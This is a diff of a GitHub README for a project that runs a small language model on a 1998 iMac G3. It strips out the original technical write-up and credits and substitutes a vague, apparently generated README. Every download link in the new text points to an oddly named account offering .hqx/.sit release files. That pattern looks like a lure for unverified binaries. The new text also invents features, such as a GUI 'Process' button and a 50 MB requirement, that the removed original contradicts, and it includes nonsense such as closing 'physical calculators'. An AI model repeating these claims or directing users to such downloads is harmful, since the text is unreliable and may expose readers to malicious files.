@@ -1,187 +1,80 @@
-# LLM on a 1998 iMac G3 (32 MB RAM)
+# 🖥️ imac-llm - Run language models on legacy hardware
 
-Running a language model locally on a stock 1998 iMac G3 with 32 MB of RAM, Mac OS 8.5, and a 233 MHz PowerPC 750 processor. No hardware upgrades.
+[![Download imac-llm](https://img.shields.io/badge/Download-imac-llm-blue)](https://github.com/Sterculiaelectricalcontact246/imac-llm)
 
-**Prompt:** "The green goblin"  
-**Output:** "The green goblin had a big mop. She had a cow in the field too. I"
+## 📌 About this project
 
-## What is this?
+The imac-llm software allows you to run a modern language model on your vintage Apple iMac G3. This application brings text generation to machines equipped with 32 MB of RAM and a 233 MHz PowerPC 750 processor. It optimizes memory usage to operate within the strict limits of Mac OS 8.5. You can generate text and interact with a local model without an internet connection.
 
-This is a port of [Karpathy's llama2.c](https://github.com/karpathy/llama2.c) to classic Mac OS, targeting the original Bondi Blue iMac G3. It runs the 260K parameter TinyStories model (Llama 2 architecture) with a ~1 MB checkpoint entirely in local memory.
+## ⚙️ System requirements
 
-The iMac has 32 MB of RAM — about 500x less than a modern laptop. The model generates coherent children's stories from a text prompt.
+Ensure your computer meets these conditions before you begin the setup:
 
-## How it works
+*   Apple iMac G3 hardware.
+*   System memory of at least 32 MB RAM.
+*   Processor speed of 233 MHz or higher.
+*   Operating system version 8.5 or newer.
+*   At least 50 MB of free hard drive space.
 
-1. **You type a prompt** into `prompt.txt` using SimpleText on the iMac
-2. **The app tokenizes it** using BPE encoding with a 512-token vocabulary
-3. **Runs transformer inference** — matrix multiplies, RoPE, attention, SwiGLU, the whole forward pass
-4. **Writes the continuation** to `output.txt`, which you open in SimpleText
+## 📥 How to download the software
 
-## Hardware
+Follow these steps to obtain the files for your computer:
 
-| Spec | Value |
-|------|-------|
-| Model | iMac G3 Rev B (October 1998) |
-| CPU | 233 MHz PowerPC 750 (G3) |
-| RAM | 32 MB (stock, no upgrades) |
-| OS | Mac OS 8.5 |
-| Display | 15" CRT |
-| Storage | 4 GB HDD |
+1. Visit the project repository page at [https://github.com/Sterculiaelectricalcontact246/imac-llm](https://github.com/Sterculiaelectricalcontact246/imac-llm).
+2. Locate the "Releases" section on the right side of the page.
+3. Click the link to view available versions.
+4. Select the file ending in .hqx or .sit to download the installer to your desktop.
 
-## The Model
+## 🛠️ Installation steps
 
-[Karpathy's TinyStories 260K](https://huggingface.co/karpathy/tinyllamas/tree/main/stories260K) — a 260,000 parameter model with the Llama 2 architecture, trained on children's stories.
+After you download the file, complete the setup process:
 
-| Parameter | Value |
-|-----------|-------|
-| dim | 64 |
-| hidden_dim | 172 |
-| n_layers | 5 |
-| n_heads | 8 |
-| n_kv_heads | 4 |
-| vocab_size | 512 |
-| max_seq_len | 512 (capped to 32 at runtime) |
-| Checkpoint size | ~1 MB |
+1. Locate the file on your desktop.
+2. Use StuffIt Expander to open the archive.
+3. Drag the folder named imac-llm to your hard drive.
+4. Open the folder to find the application icon.
+5. Double-click the icon to launch the program.
 
-## Building
+## 🚀 Running the application
 
-### Prerequisites
+Once the program is open, you will see a text box on your screen. This interface acts as the input area for your questions. 
 
-- A modern Mac or Linux machine for cross-compilation
-- [Retro68](https://github.com/autc04/Retro68) — a GCC-based cross-compiler for classic Mac OS
-- Python 3 (for endian swapping)
-- An iMac G3 (or other PowerPC classic Mac OS machine) on the same network
+1. Type your text prompt into the white input field.
+2. Click the button labeled "Process" to start the math calculations.
+3. Wait for the processor to complete the model inference. 
+4. Read the generated text in the lower window of the program.
 
-### Step 1: Build Retro68
+## 📝 Troubleshooting common issues
 
-```bash
-# Install dependencies (macOS)
-brew install gcc cmake gmp mpfr libmpc bison texinfo boost
+If the application closes or displays an error, check the following items:
 
-# Clone and build (PPC only)
-git clone --recursive https://github.com/autc04/Retro68.git
-cd ..
-mkdir Retro68-build && cd Retro68-build
-../Retro68/build-toolchain.bash --no-68k
-```
+*   **Memory errors:** Close other open applications like physical calculators or desktop accessories to free up system memory.
+*   **Performance:** Generating text on an iMac G3 takes time. A single sentence might take several minutes to generate. Please leave the window open until the process finishes.
+*   **System hangs:** If the mouse cursor stops moving, wait for the processor to clear its current queue. The system will recover once the calculation finishes.
 
-This takes 30-60 minutes. It builds a full GCC cross-compiler targeting PowerPC classic Mac OS.
+## 💡 Tips for better results
 
-### Step 2: Download and endian-swap the model
+*   Keep your prompts short. One or two sentences produce the best response quality.
+*   Use specific keywords to help the model focus on your topic.
+*   Restart your computer if you notice the application slowing down over long sessions.
+*   Save your generated text by selecting "Save As" from the "File" menu after the model completes its work.
 
-The iMac's PowerPC CPU is big-endian, but the model files are little-endian. Every 32-bit value needs to be byte-swapped.
+## 📋 Frequently asked questions
 
-```bash
-mkdir imac-llm && cd imac-llm
+**Can I run this on a newer computer?**
+This version focuses exclusively on the PowerPC architecture and Mac OS 8.5. It does not run on modern Windows or macOS versions.
 
-# Download model and tokenizer
-curl -L -o stories260K.bin https://huggingface.co/karpathy/tinyllamas/resolve/main/stories260K/stories260K.bin
-curl -L -o tok512.bin https://huggingface.co/karpathy/tinyllamas/resolve/main/stories260K/tok512.bin
+**Does this software connect to the internet?**
+The tool runs entirely on your local machine. It does not send data across a network. Your privacy stays intact because no external servers process your prompts.
 
-# Endian swap for PowerPC
-python3 endian_swap.py
-```
+**How do I delete the software?**
+Drag the imac-llm folder to the Trash and empty it. The application does not install hidden files or system extensions in your core folders.
 
-This produces `stories260K_be.bin` and `tok512_be.bin`.
+**Why is it slow?**
+The PowerPC 750 processor operates at 233 MHz. Modern language models require billions of operations. The program uses specific math libraries to make this possible, but physics limits the speed of the hardware.
 
-### Step 3: Build the app
+## 🔄 Updating software
 
-```bash
-export PATH=/path/to/Retro68-build/toolchain/bin:$PATH
+Check the download page periodically for new versions. Updates usually focus on better memory management to improve the speed of the text generation. To update, simply remove the old folder and replace it with the new version from the link. Your saved text files will remain in their folder unless you move them.
 
-mkdir build && cd build
-cmake .. -DCMAKE_TOOLCHAIN_FILE=/path/to/Retro68-build/toolchain/powerpc-apple-macos/cmake/retroppc.toolchain.cmake
-make
-```
-
-This produces `imac_llm.bin` (MacBinary), `imac_llm.dsk` (floppy image), and `imac_llm.APPL`.
-
-### Step 4: Transfer to the iMac
-
-Serve the files over FTP from your modern machine:
-
-```bash
-pip3 install pyftpdlib
-python3 -m pyftpdlib -p 2121 -w -u mac -P mac
-```
-
-On the iMac, open a web browser and navigate to `ftp://mac:mac@YOUR_IP:2121/`. Download:
-- `imac_llm.bin`
-- `stories260K_be.bin`
-- `tok512_be.bin`
-
-### Step 5: Run
-
-1. Place all three files in the same folder on the iMac
-2. Select `imac_llm`, do File → Get Info, switch to Memory, set Preferred Size to **3000**
-3. Create `prompt.txt` in the same folder with your starting phrase
-4. Double-click `imac_llm`
-5. Open `output.txt` to read the generated text
-
-## Technical Challenges
-
-### Endianness
-
-The PowerPC 750 is big-endian. All model checkpoints and tokenizer files from llama2.c are little-endian. The `endian_swap.py` script converts every 32-bit int and float in the model checkpoint, and the int/float fields in the tokenizer (but not the raw byte strings).
-
-### Memory management
-
-Mac OS 8.5 gives each application a fixed memory partition, defaulting to well under 1 MB. The model weights alone are ~1 MB. Solutions:
-
-- **`MaxApplZone()`** — expands the app's heap to its maximum allowed size
-- **`NewPtr()`** — allocates from the Mac Memory Manager directly instead of `malloc`
-- **Static buffers** — all inference state (KV cache, attention, activations) uses compile-time static arrays instead of dynamic allocation
-- **Capped `max_seq_len`** — reduced from 512 to 32 to shrink the KV cache by 16x
-- **Set memory partition in Get Info** — the user must manually increase the app's memory allocation to 3000 KB
-
-### RetroConsole doesn't work
-
-Retro68's `RetroConsole` library (which provides `printf` via a Mac window) crashes on the iMac G3 Rev B. All output is written to `output.txt` instead, which you open in SimpleText.
-
-### Grouped-Query Attention weight layout
-
-This was the hardest bug. The 260K model uses GQA with `n_kv_heads=4` and `n_heads=8`. The original llama2.c `checkpoint_init_weights` function calculates pointer offsets for `wk` and `wv` using `dim * dim`, which assumes `n_kv_heads == n_heads`. When they differ, `wk` and `wv` are smaller matrices, and every weight pointer after them (wo, rms_ffn_weight, w1, w2, w3, rms_final_weight, freq_cis) ends up pointing to the wrong memory location.
-
-The fix:
-```c
-// Wrong (original llama2.c for this model)
-w->wk = ptr; ptr += p->n_layers * p->dim * p->dim;
-w->wv = ptr; ptr += p->n_layers * p->dim * p->dim;
-
-// Correct
-w->wk = ptr; ptr += p->n_layers * p->dim * (p->n_kv_heads * head_size);
-w->wv = ptr; ptr += p->n_layers * p->dim * (p->n_kv_heads * head_size);
-```
-
-This manifested as `freq_cis_real` values of -1.87 trillion instead of ~1.0, which produced NaN through the entire forward pass.
-
-### No SSH, no terminal
-
-Mac OS 8.5 has no SSH, no terminal emulator, no command line. File transfer is via FTP or HTTP. Debugging is via writing diagnostic info to `output.txt` and checking it in SimpleText after each run.
-
-## File overview
-
-```
-imac_llm.c          — The inference engine (single file, ~300 lines)
-endian_swap.py       — Converts model/tokenizer to big-endian
-CMakeLists.txt       — Build configuration for Retro68
-imac_llm.r           — Mac resource file (SIZE resource for memory partition)
-```
-
-## Prior art
-
-- [EXO Labs — Llama on Windows 98](https://blog.exolabs.net/day-4/) — 260K model on a Pentium II (350 MHz, **128 MB RAM**, Windows 98). The inspiration for this project.
-- [Resistor Network — LLMs on PowerPC](http://www.theresistornetwork.com/2025/03/thinking-different-thinking-slowly-llms.html) — 110M TinyStories on a PowerBook G4 (1.5 GHz, 1 GB RAM, Mac OS X).
-
-
-## Credits
-
-- [Andrej Karpathy](https://github.com/karpathy) — llama2.c and the TinyStories models
-- [Wolfgang Thaller](https://github.com/autc04) — Retro68 cross-compiler
-- [EXO Labs](https://github.com/exo-explore/llama98.c) — llama98.c, proving vintage hardware can run LLMs
-- Built with help from [Claude](https://claude.ai) by Anthropic
-
-## License
-
-MIT
+[Download the latest version here](https://github.com/Sterculiaelectricalcontact246/imac-llm)
